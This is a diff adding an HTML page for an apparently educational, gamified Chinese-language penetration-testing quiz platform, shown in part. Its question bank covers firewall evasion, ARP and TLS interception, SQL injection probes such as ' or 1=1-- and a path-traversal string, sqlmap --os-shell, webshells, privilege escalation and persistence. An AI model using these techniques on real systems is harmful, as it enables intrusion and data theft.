@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🖥️ 渗透学习平台 - 个人信息点</title>
+<style>
+/* ===== CRT 基础 ===== */
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+    background: #000;
+    color: #00ff41;
+    font-family: 'Courier New', Courier, monospace;
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+}
+/* 扫描线 */
+body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,0.08) 2px,
+        rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+}
+/* CRT 屏幕发光 */
+body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse at center,
+        transparent 60%,
+        rgba(0,0,0,0.5) 100%
+    );
+    pointer-events: none;
+    z-index: 9998;
+}
+
+/* ===== 顶部标题栏 ===== */
+.header {
+    background: linear-gradient(90deg, #001a00, #002800, #001a00);
+    border-bottom: 2px solid #00ff41;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 0 20px rgba(0,255,65,0.2);
+    position: relative;
+    z-index: 100;
+}
+.header-title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #00ff41;
+    text-shadow: 0 0 10px #00ff41;
+    letter-spacing: 2px;
+}
+.header-sub {
+    font-size: 9px;
+    color: #005500;
+    margin-top: 2px;
+    letter-spacing: 1px;
+}
+.header-right {
+    text-align: right;
+}
+.overall-badge {
+    font-size: 11px;
+    color: #00ff41;
+    background: rgba(0,255,65,0.08);
+    border: 1px solid rgba(0,255,65,0.3);
+    padding: 4px 12px;
+    border-radius: 3px;
+}
+
+/* ===== 总进度仪表盘 ===== */
+.dashboard {
+    padding: 14px 20px 10px;
+    background: rgba(0,20,0,0.5);
+    border-bottom: 1px solid #003300;
+}
+.dashboard-title {
+    font-size: 10px;
+    color: #005500;
+    margin-bottom: 8px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+}
+.dash-meters {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+}
+.dash-meter {
+    flex: 1;
+}
+.dash-meter-label {
+    font-size: 8px;
+    color: #008800;
+    margin-bottom: 3px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+.dash-meter-bar {
+    height: 6px;
+    background: #001a00;
+    border-radius: 3px;
+    overflow: hidden;
+    border: 1px solid #003300;
+}
+.dash-meter-fill {
+    height: 100%;
+    border-radius: 3px;
+    transition: width 0.5s;
+}
+.dash-meter-val {
+    font-size: 8px;
+    color: #00aa00;
+    margin-top: 2px;
+    text-align: right;
+}
+/* 总体平均仪表 */
+.total-meter {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 12px;
+    background: rgba(0,255,65,0.03);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    min-width: 180px;
+}
+.total-meter-circle {
+    width: 48px; height: 48px;
+    border-radius: 50%;
+    border: 3px solid #003300;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: bold;
+    color: #00ff41;
+    flex-shrink: 0;
+    position: relative;
+}
+.total-meter-circle svg {
+    position: absolute; top: 0; left: 0;
+    transform: rotate(-90deg);
+}
+.total-meter-circle .val {
+    position: relative; z-index: 1;
+}
+.total-meter-info { font-size: 9px; }
+.total-meter-info .rank { color: #00ff41; font-size: 11px; }
+.total-meter-info .label { color: #005500; margin-top: 2px; }
+
+/* ===== 主内容网格 ===== */
+.main-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    padding: 14px 20px;
+}
+@media (max-width: 700px) {
+    .main-grid { grid-template-columns: 1fr; }
+}
+
+/* ===== 节点卡片 ===== */
+.node-card {
+    background: rgba(0,15,0,0.8);
+    border: 1px solid #003300;
+    border-radius: 6px;
+    overflow: hidden;
+    transition: border-color 0.3s;
+}
+.node-card:hover { border-color: #00aa00; }
+.node-card.node-complete { border-color: #ff1744; box-shadow: 0 0 10px rgba(255,23,68,0.2); }
+
+.node-header {
+    padding: 10px 14px 8px;
+    background: rgba(0,255,65,0.04);
+    border-bottom: 1px solid #002200;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.node-icon {
+    font-size: 18px;
+    flex-shrink: 0;
+}
+.node-name {
+    font-size: 13px;
+    font-weight: bold;
+    color: #00ff41;
+    text-shadow: 0 0 6px rgba(0,255,65,0.4);
+}
+.node-sublabel {
+    font-size: 8px;
+    color: #005500;
+    margin-top: 1px;
+}
+.node-rank {
+    margin-left: auto;
+    font-size: 9px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    border: 1px solid;
+    white-space: nowrap;
+}
+
+/* 进度条区域 */
+.node-progress-area {
+    padding: 10px 14px;
+    border-bottom: 1px solid #002200;
+}
+.progress-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 5px;
+}
+.progress-pct {
+    font-size: 22px;
+    font-weight: bold;
+    min-width: 52px;
+    text-align: right;
+    line-height: 1;
+}
+.progress-bar-wrap {
+    flex: 1;
+    height: 14px;
+    background: #001a00;
+    border-radius: 7px;
+    overflow: hidden;
+    border: 1px solid #003300;
+}
+.progress-bar-fill {
+    height: 100%;
+    border-radius: 7px;
+    transition: width 0.6s cubic-bezier(0.4,0,0.2,1);
+    position: relative;
+    overflow: hidden;
+}
+/* 进度条流光效果 */
+.progress-bar-fill::after {
+    content: '';
+    position: absolute;
+    top: 0; right: 0; bottom: 0;
+    width: 20px;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3));
+    animation: shimmer 2s infinite;
+}
+@keyframes shimmer { 0%,100%{opacity:0} 50%{opacity:1} }
+
+/* 节点按钮 */
+.node-btns {
+    padding: 8px 14px;
+    display: flex;
+    gap: 8px;
+    border-bottom: 1px solid #002200;
+}
+.btn-quiz, .btn-sim {
+    flex: 1;
+    padding: 7px 0;
+    border: none;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-weight: bold;
+}
+.btn-quiz {
+    background: rgba(0,255,65,0.08);
+    border: 1px solid rgba(0,255,65,0.3);
+    color: #00ff41;
+}
+.btn-quiz:hover { background: rgba(0,255,65,0.15); box-shadow: 0 0 8px rgba(0,255,65,0.3); }
+.btn-sim {
+    background: rgba(0,180,255,0.06);
+    border: 1px solid rgba(0,180,255,0.3);
+    color: #00b4ff;
+}
+.btn-sim:hover { background: rgba(0,180,255,0.12); box-shadow: 0 0 8px rgba(0,180,255,0.3); }
+
+/* 节点历史 */
+.node-history {
+    padding: 6px 14px 8px;
+    min-height: 50px;
+}
+.history-item {
+    font-size: 8px;
+    color: #005500;
+    padding: 2px 0;
+    border-bottom: 1px solid #001a00;
+    display: flex;
+    justify-content: space-between;
+}
+.history-item:last-child { border-bottom: none; }
+.history-item .hi-text { color: #006600; }
+.history-item .hi-delta { font-weight: bold; }
+.history-item .hi-delta.pos { color: #00cc44; }
+.history-item .hi-delta.neg { color: #ff4444; }
+
+/* ===== 弹出层：答题面板 ===== */
+.overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.9);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+}
+.overlay.active { display: flex; }
+
+.modal {
+    background: #050f05;
+    border: 1px solid #00ff41;
+    border-radius: 8px;
+    padding: 20px;
+    width: 90%;
+    max-width: 520px;
+    max-height: 85vh;
+    overflow-y: auto;
+    box-shadow: 0 0 30px rgba(0,255,65,0.2);
+}
+.modal-title {
+    font-size: 14px;
+    color: #00ff41;
+    font-weight: bold;
+    margin-bottom: 4px;
+    text-shadow: 0 0 8px rgba(0,255,65,0.5);
+}
+.modal-subtitle {
+    font-size: 9px;
+    color: #005500;
+    margin-bottom: 14px;
+    letter-spacing: 1px;
+}
+
+/* 答题内容 */
+.quiz-progress-bar {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 12px;
+}
+.qpb-dot {
+    flex: 1;
+    height: 4px;
+    border-radius: 2px;
+    background: #002200;
+    border: 1px solid #003300;
+    transition: background 0.3s;
+}
+.qpb-dot.current { background: #00ff41; }
+.qpb-dot.done-correct { background: #00cc44; }
+.qpb-dot.done-wrong { background: #ff4444; }
+
+.quiz-question {
+    font-size: 12px;
+    color: #00cc44;
+    line-height: 1.5;
+    margin-bottom: 12px;
+    padding: 10px;
+    background: rgba(0,255,65,0.03);
+    border: 1px solid #002200;
+    border-radius: 4px;
+}
+.quiz-q-num {
+    font-size: 9px;
+    color: #005500;
+    margin-bottom: 4px;
+}
+.quiz-options {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    margin-bottom: 12px;
+}
+.quiz-option {
+    padding: 8px 12px;
+    border: 1px solid #003300;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 11px;
+    color: #008800;
+    background: rgba(0,255,65,0.02);
+    transition: all 0.2s;
+    position: relative;
+}
+.quiz-option:hover:not(.disabled) {
+    border-color: #00ff41;
+    background: rgba(0,255,65,0.06);
+    color: #00ff41;
+}
+.quiz-option.correct {
+    border-color: #00ff41;
+    background: rgba(0,255,65,0.12);
+    color: #00ff41;
+    pointer-events: none;
+}
+.quiz-option.wrong {
+    border-color: #ff4444;
+    background: rgba(255,68,68,0.08);
+    color: #ff6666;
+    pointer-events: none;
+}
+.quiz-option.disabled { pointer-events: none; opacity: 0.6; }
+.quiz-feedback {
+    font-size: 10px;
+    padding: 8px 10px;
+    border-radius: 4px;
+    margin-bottom: 10px;
+}
+.quiz-feedback.ok { background: rgba(0,255,65,0.06); border: 1px solid rgba(0,255,65,0.2); color: #00ff41; }
+.quiz-feedback.fail { background: rgba(255,68,68,0.06); border: 1px solid rgba(255,68,68,0.2); color: #ff6666; }
+
+/* 答题结束汇总 */
+.quiz-summary {
+    text-align: center;
+    padding: 10px 0;
+}
+.quiz-summary .score-big {
+    font-size: 32px;
+    font-weight: bold;
+    color: #00ff41;
+    text-shadow: 0 0 12px #00ff41;
+}
+.quiz-summary .score-label {
+    font-size: 10px;
+    color: #005500;
+    margin-top: 4px;
+    margin-bottom: 12px;
+}
+.quiz-summary .progress-delta {
+    font-size: 14px;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+.delta-pos { color: #00cc44; }
+.delta-neg { color: #ff4444; }
+
+/* ===== 模拟实操终端 ===== */
+.terminal {
+    background: #000;
+    border: 1px solid #003300;
+    border-radius: 4px;
+    padding: 10px;
+    font-size: 10px;
+    line-height: 1.6;
+    min-height: 120px;
+    max-height: 280px;
+    overflow-y: auto;
+    margin-bottom: 10px;
+    font-family: 'Courier New', monospace;
+}
+.term-line { margin: 1px 0; }
+.term-cmd { color: #00ff41; }
+.term-cmd::before { content: '$ '; color: #005500; }
+.term-out { color: #008800; }
+.term-ok { color: #00cc44; }
+.term-err { color: #ff6666; }
+.term-warn { color: #ffaa00; }
+.term-info { color: #00aaff; }
+.term-cursor {
+    display: inline-block;
+    width: 8px; height: 12px;
+    background: #00ff41;
+    animation: blink 0.8s infinite;
+    vertical-align: middle;
+}
+@keyframes blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }
+
+/* 实操步骤选择 */
+.sim-steps {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    margin-bottom: 10px;
+}
+.sim-step-btn {
+    padding: 8px 12px;
+    border: 1px solid #003300;
+    border-radius: 4px;
+    background: rgba(0,180,255,0.03);
+    color: #00aacc;
+    font-size: 10px;
+    cursor: pointer;
+    font-family: 'Courier New', monospace;
+    text-align: left;
+    transition: all 0.2s;
+}
+.sim-step-btn:hover:not(:disabled) {
+    border-color: #00b4ff;
+    background: rgba(0,180,255,0.08);
+    color: #00d4ff;
+}
+.sim-step-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+.sim-step-btn.done {
+    border-color: #006600;
+    color: #00aa44;
+    background: rgba(0,255,65,0.04);
+}
+
+/* 通用按钮 */
+.btn-close {
+    padding: 7px 18px;
+    background: rgba(255,68,68,0.08);
+    border: 1px solid rgba(255,68,68,0.3);
+    color: #ff6666;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.2s;
+}
+.btn-close:hover { background: rgba(255,68,68,0.15); }
+.btn-primary {
+    padding: 7px 18px;
+    background: rgba(0,255,65,0.08);
+    border: 1px solid rgba(0,255,65,0.3);
+    color: #00ff41;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.2s;
+}
+.btn-primary:hover { background: rgba(0,255,65,0.15); }
+.btn-row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 10px; }
+
+/* ===== 全局日志 ===== */
+.global-log {
+    margin: 0 20px 20px;
+    background: rgba(0,10,0,0.8);
+    border: 1px solid #002200;
+    border-radius: 6px;
+    padding: 10px 14px;
+}
+.log-title {
+    font-size: 9px;
+    color: #005500;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+    border-bottom: 1px solid #001a00;
+    padding-bottom: 4px;
+}
+.log-entry {
+    font-size: 9px;
+    color: #004400;
+    padding: 2px 0;
+    border-bottom: 1px solid #001500;
+    display: flex;
+    gap: 6px;
+}
+.log-entry:last-child { border-bottom: none; }
+.log-ts { color: #003300; min-width: 55px; }
+.log-node { min-width: 70px; color: #005500; }
+.log-msg { flex: 1; color: #006600; }
+.log-delta { font-weight: bold; }
+.log-delta.pos { color: #00aa44; }
+.log-delta.neg { color: #ff4444; }
+
+/* ===== 段位颜色 ===== */
+.rank-0 { color: #00aa44; border-color: #00aa44; }
+.rank-1 { color: #00cc44; border-color: #00cc44; }
+.rank-2 { color: #aacc00; border-color: #aacc00; }
+.rank-3 { color: #ffaa00; border-color: #ffaa00; }
+.rank-4 { color: #ff6600; border-color: #ff6600; }
+.rank-5 { color: #ff2200; border-color: #ff2200; }
+.rank-6 { color: #ff1744; border-color: #ff1744; box-shadow: 0 0 6px rgba(255,23,68,0.3); }
+
+/* 进度条颜色 */
+.pbar-0 { background: linear-gradient(90deg, #003300, #00aa44); }
+.pbar-1 { background: linear-gradient(90deg, #004400, #00cc44); }
+.pbar-2 { background: linear-gradient(90deg, #445500, #aacc00); }
+.pbar-3 { background: linear-gradient(90deg, #553300, #ffaa00); }
+.pbar-4 { background: linear-gradient(90deg, #552200, #ff6600); }
+.pbar-5 { background: linear-gradient(90deg, #550000, #ff2200); }
+.pbar-6 { background: linear-gradient(90deg, #330000, #ff1744); }
+
+/* 进度文字颜色 */
+.pct-0 { color: #00aa44; }
+.pct-1 { color: #00cc44; }
+.pct-2 { color: #aacc00; }
+.pct-3 { color: #ffaa00; }
+.pct-4 { color: #ff6600; }
+.pct-5 { color: #ff2200; }
+.pct-6 { color: #ff1744; text-shadow: 0 0 8px rgba(255,23,68,0.5); }
+
+/* 重置按钮 */
+.reset-btn {
+    padding: 4px 10px;
+    background: rgba(255,68,68,0.05);
+    border: 1px solid rgba(255,68,68,0.2);
+    color: #cc3333;
+    font-family: 'Courier New', monospace;
+    font-size: 8px;
+    cursor: pointer;
+    border-radius: 3px;
+}
+.reset-btn:hover { background: rgba(255,68,68,0.1); }
+</style>
+</head>
+<body>
+
+<!-- 顶部标题栏 -->
+<div class="header">
+    <div>
+        <div class="header-title">🖥️ 渗透学习平台</div>
+        <div class="header-sub">PERSONAL HACK TRAINING NODE / 个人信息点</div>
+    </div>
+    <div class="header-right" id="headerRight">
+        <div id="worldServerEntry" style="display:none;margin-bottom:6px;">
+            <button onclick="enterWorldServer()" style="padding:5px 14px;background:rgba(0,180,255,0.1);border:1px solid rgba(0,180,255,0.4);color:#00b4ff;font-family:'Courier New',monospace;font-size:11px;cursor:pointer;border-radius:4px;font-weight:bold;">🌐 进入世界服务器</button>
+        </div>
+        <div class="overall-badge">总进度 <span id="overallPct">0</span>%</div>
+    </div>
+</div>
+
+<!-- 总进度仪表盘 -->
+<div class="dashboard">
+    <div class="dashboard-title">▸ 节点总览</div>
+    <div class="dash-meters">
+        <div class="dash-meter">
+            <div class="dash-meter-label">🔥 外层防火墙</div>
+            <div class="dash-meter-bar"><div class="dash-meter-fill" id="dm-firewall" style="width:0%"></div></div>
+            <div class="dash-meter-val"><span id="dv-firewall">0</span>%</div>
+        </div>
+        <div class="dash-meter">
+            <div class="dash-meter-label">🌐 网关节点</div>
+            <div class="dash-meter-bar"><div class="dash-meter-fill" id="dm-gateway" style="width:0%"></div></div>
+            <div class="dash-meter-val"><span id="dv-gateway">0</span>%</div>
+        </div>
+        <div class="dash-meter">
+            <div class="dash-meter-label">🗄️ 数据库存</div>
+            <div class="dash-meter-bar"><div class="dash-meter-fill" id="dm-database" style="width:0%"></div></div>
+            <div class="dash-meter-val"><span id="dv-database">0</span>%</div>
+        </div>
+        <div class="dash-meter">
+            <div class="dash-meter-label">⚙️ 应用/核心系统</div>
+            <div class="dash-meter-bar"><div class="dash-meter-fill" id="dm-appcore" style="width:0%"></div></div>
+            <div class="dash-meter-val"><span id="dv-appcore">0</span>%</div>
+        </div>
+        <div style="display:flex;align-items:center;padding-left:10px;">
+            <button class="reset-btn" onclick="confirmReset()">⚠ 重置</button>
+        </div>
+    </div>
+</div>
+
+<!-- 4个节点卡片 -->
+<div class="main-grid" id="nodesGrid">
+    <!-- 由 JS 渲染 -->
+</div>
+
+<!-- 全局日志 -->
+<div class="global-log">
+    <div class="log-title">▸ 学习日志</div>
+    <div id="globalLogArea">
+        <div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-node">系统</span><span class="log-msg">等待学习操作...</span></div>
+    </div>
+</div>
+
+<!-- 答题弹出层 -->
+<div class="overlay" id="quizOverlay">
+    <div class="modal" id="quizModal">
+        <div class="modal-title" id="quizModalTitle">📝 答题挑战</div>
+        <div class="modal-subtitle" id="quizModalSub">每次随机3题 · 答对+5 · 答错-2</div>
+        <div id="quizContent"></div>
+    </div>
+</div>
+
+<!-- 模拟实操弹出层 -->
+<div class="overlay" id="simOverlay">
+    <div class="modal" id="simModal">
+        <div class="modal-title" id="simModalTitle">💻 模拟实操</div>
+        <div class="modal-subtitle" id="simModalSub">按步骤执行操作 · 完成获得进度</div>
+        <div id="simContent"></div>
+    </div>
+</div>
+
+<script>
+// ===== 常量 =====
+var STORAGE_KEY = 'hackTrainingProgress';
+
+var NODES = [
+    { key: 'firewall', name: '外层防火墙',      icon: '🔥', sub: 'OUTER FIREWALL PENETRATION' },
+    { key: 'gateway',  name: '网关节点',          icon: '🌐', sub: 'GATEWAY NODE INFILTRATION' },
+    { key: 'database', name: '数据库存',          icon: '🗄️', sub: 'DATABASE LAYER EXPLOITATION' },
+    { key: 'appcore',  name: '应用服务/核心系统', icon: '⚙️', sub: 'APPLICATION / CORE SYSTEM TAKEOVER' }
+];
+
+var RANKS = [
+    { min: 0,  max: 9,   label: '🔰 入门学员',   cls: 'rank-0', pbar: 'pbar-0', pct: 'pct-0' },
+    { min: 10, max: 29,  label: '🟢 初级渗透',   cls: 'rank-1', pbar: 'pbar-1', pct: 'pct-1' },
+    { min: 30, max: 49,  label: '🟡 中级渗透',   cls: 'rank-2', pbar: 'pbar-2', pct: 'pct-2' },
+    { min: 50, max: 69,  label: '🟠 高级渗透',   cls: 'rank-3', pbar: 'pbar-3', pct: 'pct-3' },
+    { min: 70, max: 89,  label: '🔴 专家级',     cls: 'rank-4', pbar: 'pbar-4', pct: 'pct-4' },
+    { min: 90, max: 99,  label: '⚡ 精英黑客',   cls: 'rank-5', pbar: 'pbar-5', pct: 'pct-5' },
+    { min: 100, max: 100, label: '💀 完全渗透',  cls: 'rank-6', pbar: 'pbar-6', pct: 'pct-6' }
+];
+
+// ===== 题库 =====
+var QUIZ_BANK = {
+    firewall: [
+        { q: '以下哪种扫描技术可以绕过大多数无状态防火墙？', opts: ['SYN半开扫描（nmap -sS）','TCP全连接扫描','UDP全量扫描','ICMP ping扫描'], ans: 0 },
+        { q: '防火墙通常无法检测到哪种类型的攻击流量？', opts: ['加密隧道（如HTTPS内的C2通信）','明文HTTP请求','SYN flood攻击','端口扫描'],  ans: 0 },
+        { q: '使用"碎片化IP包"绕过防火墙的原理是？', opts: ['防火墙通常只检查第一个分片，不重组检测','碎片包会被防火墙直接放行','碎片包比正常包速度更快','防火墙无法处理IPv6碎片'], ans: 0 },
+        { q: '哪种协议隧道最难被防火墙检测和过滤？', opts: ['DNS over HTTPS (DoH)','FTP数据传输','Telnet明文连接','ICMP ping'], ans: 0 },
+        { q: '访问控制列表（ACL）的默认拒绝策略（Default Deny）意味着什么？', opts: ['所有未被明确允许的流量都被拒绝','所有流量都被允许通过','只拒绝已知攻击特征的流量','ACL不起作用'], ans: 0 },
+        { q: '状态检测防火墙（Stateful Firewall）相比包过滤防火墙的优势是？', opts: ['能追踪TCP连接状态，防止非法会话劫持','速度更快','体积更小','更便宜'], ans: 0 },
+        { q: '下列哪种行为最可能触发IDS/IPS的警报？', opts: ['大量端口扫描（port sweep）','单次HTTP GET请求','正常的DNS查询','HTTPS网页浏览'], ans: 0 },
+        { q: '绕过基于源IP的防火墙规则，最有效的方法是？', opts: ['使用代理/跳板机或VPN伪装源IP','等待防火墙规则过期','多次重试同一请求','使用IPv6地址'], ans: 0 },
+        { q: '在端口扫描中，收到RST响应意味着什么？', opts: ['端口关闭，主机存活','端口开放','防火墙过滤了该端口','主机宕机'], ans: 0 },
+        { q: '应用层防火墙（WAF）主要检测什么类型的攻击？', opts: ['SQL注入、XSS、CSRF等Web应用层攻击','网络层的DDoS','物理层的线路窃听','传输层的TCP劫持'], ans: 0 },
+        { q: '以下哪项是"防火墙规则顺序"中最重要的原则？', opts: ['规则按从上到下顺序匹配，第一条匹配的规则生效','规则按权重排序','最后一条规则优先','规则随机匹配'], ans: 0 },
+        { q: '使用nmap的"-f"参数的作用是？', opts: ['将数据包碎片化，绕过部分防火墙','加快扫描速度','扫描所有65535端口','绕过防火墙的DNS检测'], ans: 0 },
+        { q: '防火墙的"白名单"策略与"黑名单"策略相比，安全性更高的原因是？', opts: ['白名单只允许明确授权的流量，所有未知流量默认拒绝','黑名单更复杂','白名单部署更简单','黑名单会产生误报'], ans: 0 },
+        { q: '下列哪种攻击可以直接穿越防火墙的80/443端口而不被检测？', opts: ['利用合法HTTPS流量伪装的反向Shell','SYN flood','UDP炸弹','ICMP Smurf'], ans: 0 },
+        { q: '在渗透测试中，使用"慢速扫描"的目的是？', opts: ['降低触发速率检测规则的概率，规避IDS告警','加快扫描完成时间','减少网络带宽占用','隐藏目标IP地址'], ans: 0 }
+    ],
+    gateway: [
+        { q: 'ARP欺骗攻击的核心原理是？', opts: ['向局域网广播伪造的ARP响应，将网关MAC与攻击者MAC绑定','修改DNS解析结果','劫持DHCP地址分配','伪造路由器广播'], ans: 0 },
+        { q: 'BGP劫持攻击中，攻击者通过什么手段让流量经过自己？', opts: ['向BGP邻居宣告更具体的前缀（/25比/24更优先）','修改本地DNS','发送大量TCP RST','暴力破解路由器密码'], ans: 0 },
+        { q: 'SSL/TLS中间人攻击（MITM）成功的前提条件是？', opts: ['受害者信任了攻击者的伪造证书','路由器有漏洞','目标使用HTTP协议','目标系统未打补丁'], ans: 0 },
+        { q: 'VLAN跳跃攻击（VLAN Hopping）利用的是哪种协议的漏洞？', opts: ['802.1Q Trunk协议（DTP自动协商）','OSPF路由协议','RADIUS认证协议','SSH加密协议'], ans: 0 },
+        { q: 'DHCP饥饿攻击（DHCP Starvation）的目的是？', opts: ['耗尽DHCP地址池，然后部署恶意DHCP服务器','获取路由器密码','嗅探网络流量','绕过访问控制'], ans: 0 },
+        { q: '在进行ARP欺骗时，需要开启哪个内核功能才能实现流量转发？', opts: ['IP Forward（/proc/sys/net/ipv4/ip_forward）','IP Masquerade','NAT转发','路由协议'], ans: 0 },
+        { q: 'STP（Spanning Tree Protocol）攻击可以导致什么后果？', opts: ['攻击者的机器成为根桥，所有流量经过攻击者','网络速度加快','VLAN隔离失效','交换机重启'], ans: 0 },
+        { q: '以下哪种工具常用于网关层的中间人攻击？', opts: ['Ettercap / Bettercap','Metasploit','SQLmap','Burp Suite'], ans: 0 },
+        { q: 'OSPF路由注入攻击需要什么前提？', opts: ['攻击者机器必须在同一OSPF区域内，且能建立邻居关系','知道路由器的enable密码','控制DNS服务器','获得BGP AS号'], ans: 0 },
+        { q: '为什么动态ARP检测（DAI）能防止ARP欺骗？', opts: ['通过DHCP Snooping绑定表验证ARP响应的IP-MAC对应关系','速度更快','直接丢弃所有ARP包','加密ARP协议'], ans: 0 },
+        { q: 'GRE隧道被用于网络攻击时，其主要优势是？', opts: ['可以封装任意三层协议，穿越防火墙策略','加密通信内容','减小数据包大小','提高传输速度'], ans: 0 },
+        { q: 'CDP（Cisco发现协议）信息泄露的危害是？', opts: ['暴露网络拓扑、设备型号、IOS版本等信息供攻击者侦察','导致设备重启','影响路由计算','触发流量风暴'], ans: 0 },
+        { q: '网关密码嗅探最有效的时机是？', opts: ['用户登录路由器管理界面时（telnet/HTTP明文传输）','设备启动时','网络空闲时','路由表更新时'], ans: 0 },
+        { q: '路由表投毒（Route Poisoning）攻击的效果是？', opts: ['让正常流量走向错误路径或攻击者控制的节点','加速路由收敛','增加跳数','提高路由优先级'], ans: 0 },
+        { q: '在内网渗透时，发现网关后最优先要做的是？', opts: ['识别网关类型、版本和开放服务，寻找已知CVE漏洞','立即暴力破解密码','发起DDoS攻击','修改路由表'], ans: 0 }
+    ],
+    database: [
+        { q: '最基础的SQL注入验证Payload是？', opts: ["单引号 ' 或 1=1--，观察是否产生报错或逻辑绕过",'反斜杠 \\\\','XSS注入','../../../etc/passwd'], ans: 0 },
+        { q: 'UNION注入攻击的前提条件是？', opts: ['知道原查询返回的列数，且数据类型兼容','数据库运行在Linux上','有DBA权限','存在存储过程'], ans: 0 },
+        { q: '盲注（Blind SQL Injection）的特点是？', opts: ['页面不显示报错，通过布尔值或时间延迟来推断数据','注入立即显示数据','需要管理员权限','只对MySQL有效'], ans: 0 },
+        { q: 'sqlmap的--os-shell参数可以实现什么？', opts: ['通过SQL注入上传webshell，获取操作系统级别的交互Shell','导出数据库内容','绕过WAF','破解密码哈希'], ans: 0 },
+        { q: '在MySQL中，通过SQL注入读取服务器文件的函数是？', opts: ['LOAD_FILE()','CONCAT()','SUBSTR()','ASCII()'], ans: 0 },
+        { q: '什么是"二阶SQL注入"（Second-Order Injection）？', opts: ['恶意数据先存入数据库，在后续操作中被提取执行时才触发注入','一次查询中两个注入点','需要两台服务器配合','通过中间件触发'], ans: 0 },
+        { q: 'NoSQL注入攻击（如MongoDB）通常注入什么类型的数据？', opts: ['JSON格式的查询操作符（如$where、$ne、$regex）','SQL语句','XML数据','Base64编码'], ans: 0 },
+        { q: '数据库权限提升中，xp_cmdshell存储过程存在于哪个数据库中？', opts: ['Microsoft SQL Server','MySQL','PostgreSQL','Oracle'], ans: 0 },
+        { q: '在SQL注入中，注释符"--"的作用是？', opts: ['截断原始SQL语句后面的内容，忽略原有条件','提高查询速度','加密查询','标记参数边界'], ans: 0 },
+        { q: '数据库连接字符串泄露最常见的发生场景是？', opts: ['应用程序报错信息、配置文件被读取、代码仓库泄露','数据库主动发送','网络广播','防火墙日志'], ans: 0 },
+        { q: 'ORM框架（如Hibernate）能完全防止SQL注入吗？', opts: ['不能完全防止，使用原生查询(Native Query)时仍然有风险','完全防止，ORM自动参数化','只能防止基础注入','取决于数据库类型'], ans: 0 },
+        { q: '时间盲注中，MySQL的延迟函数是？', opts: ['SLEEP(N)','WAITFOR DELAY','pg_sleep(N)','DELAY(N)'], ans: 0 },
+        { q: '获得数据库Shell后，提权到操作系统的常见方法是？', opts: ['利用UDF（用户自定义函数）执行系统命令','修改数据库配置','导出所有数据','创建新管理员账户'], ans: 0 },
+        { q: '以下哪种措施最有效防止SQL注入？', opts: ['使用参数化查询（Prepared Statement）','增加输入长度限制','过滤特殊字符','使用存储过程'], ans: 0 },
+        { q: '数据库备份文件（.sql/.bak）被攻击者获取后，最直接的危害是？', opts: ['包含完整的数据库结构和数据，可恢复密码哈希进行离线破解','导致数据库宕机','触发安全告警','自动删除数据'], ans: 0 }
+    ],
+    appcore: [
+        { q: 'IDOR（不安全直接对象引用）漏洞的典型特征是？', opts: ['通过修改URL中的ID参数直接访问其他用户的资源','需要管理员权限才能利用','只在移动端出现','必须配合XSS使用'], ans: 0 },
+        { q: 'Webshell通常以什么形式存在？', opts: ['一句话木马（如PHP一行代码执行POST参数）','正常的web页面','数据库记录','日志文件'], ans: 0 },
+        { q: 'RCE（远程代码执行）漏洞最危险的原因是？', opts: ['攻击者可以直接在目标服务器上执行任意系统命令，完全控制服务器','会泄露用户数据','会导致服务器宕机','会影响数据库'], ans: 0 },
+        { q: 'Linux系统中，SUID权限提升的原理是？', opts: ['具有SUID权限的可执行文件以文件所有者身份运行，若owner是root则可提权','SUID允许任何人修改文件','SUID绕过防火墙','SUID加密执行过程'], ans: 0 },
+        { q: '内网横向移动中，Pass-the-Hash攻击需要什么？', opts: ['NTLM密码哈希值（不需要明文密码）','知道明文密码','域管理员权限','物理接触目标机器'], ans: 0 },
+        { q: '持久化后门中，Crontab被用于？', opts: ['定时执行恶意脚本，保持对目标的持续访问','加密文件','掩盖攻击痕迹','提升网络速度'], ans: 0 },
